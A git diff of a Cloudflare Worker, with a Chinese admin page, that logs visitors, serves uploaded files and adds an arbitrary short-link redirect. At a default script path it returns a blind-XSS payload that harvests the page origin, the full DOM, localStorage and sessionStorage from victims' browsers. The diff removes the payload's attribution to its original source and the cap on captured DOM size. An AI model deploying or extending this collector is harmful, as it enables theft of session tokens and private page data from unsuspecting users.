@@ -70,6 +70,13 @@ const adminPageTemplate = "<!DOCTYPE html>\n" +
     "    <input type=\"submit\" value=\"保存\">\n" +
     "</form>\n" +
     "\n" +
+    "<h4>生成跳转短链接</h4>\n" +
+    "<form action=\"?short=do\" method=\"post\">\n" +
+    "    短链地址: <input type=\"text\" name=\"name\"><br>\n" +
+    "    跳转链接: <input type=\"text\" name=\"target\">\n" +
+    "    <input type=\"submit\" value=\"保存\">\n" +
+    "</form>\n" +
+    "\n" +
     "<h4>访问记录</h4>\n" +
     "\n" +
     "<table>\n" +
@@ -111,6 +118,12 @@ async function handleRequest(request, env) {
                 const body = JSON.parse(await readRequestBody(request))
                 await env.kv_storage.put("file_" + body.name, body.base64)
                 return new Response("文件上传成功: " + body.name)
+            }
+
+            if (searchParams.has("short")) {
+                const body = JSON.parse(await readRequestBody(request))
+                await env.kv_storage.put("short_" + body.name, body.target)
+                return new Response("短链接设置成功: /s/" + body.name)
             }
 
             return new Response("未知请求")
@@ -169,16 +182,33 @@ async function handleRequest(request, env) {
     if (request.method === "GET") {
         // Return the script or the file
 
-        // Log the visitor
-        const randomKey = "get" + "_" + new Date().getTime() + "_" + getUuid()
-        await env.kv_storage.put(randomKey, "", {
-            metadata: metadata
-        });
-        console.log("GET request logged: " + JSON.stringify(metadata))
+        try {
+            // Log the visitor
+            const randomKey = "get" + "_" + new Date().getTime() + "_" + getUuid()
+            await env.kv_storage.put(randomKey, "", {
+                metadata: metadata
+            });
+            console.log("GET request logged: " + JSON.stringify(metadata))
+        } catch (e) {
+            console.error(e)
+        }
 
         // Parse the url and try to get data
-        let b64Data = null
-        if (url.pathname.substring(1) !== "" && url.pathname.substring(1) !== DEFAULT_SCRIPT_NAME) {
+        if (url.pathname.substring(0, 3) === "/s/") {
+            let target
+            console.log("Try fetching target from kv storage: " + url.pathname.substring(3))
+            target = await env.kv_storage.get("short_" + url.pathname.substring(3))
+
+            if (target === null) {
+                console.log("Missing key from kv storage, using default.")
+                target = "https://www.baidu.com/"
+            } else {
+                console.log("Got data from kv storage, length: " + target.length)
+            }
+
+            return Response.redirect(target, 301)
+        } else if (url.pathname.substring(1) !== "" && url.pathname.substring(1) !== DEFAULT_SCRIPT_NAME) {
+            let b64Data
             console.log("Try fetching data from kv storage: " + url.pathname.substring(1))
             b64Data = await env.kv_storage.get("file_" + url.pathname.substring(1))
 
@@ -191,8 +221,7 @@ async function handleRequest(request, env) {
 
             return new Response(base64js.toByteArray(b64Data))
         } else if (url.pathname.substring(1) !== "" && url.pathname.substring(1) === DEFAULT_SCRIPT_NAME) {
-            return new Response('// From https://github.com/mazen160/xless/blob/master/payload.js\n' +
-                '\n' +
+            return new Response(
                 'console.log("Loaded script.");\n' +
                 'var collected_data = {};\n' +
                 '\n' +
@@ -222,7 +251,6 @@ async function handleRequest(request, env) {
                 '        try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}\n' +
                 '        try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}\n' +
                 '        try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}\n' +
-                '        collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)\n' +
                 '        try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}\n' +
                 '        try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}\n' +
                 '        try {\n' +
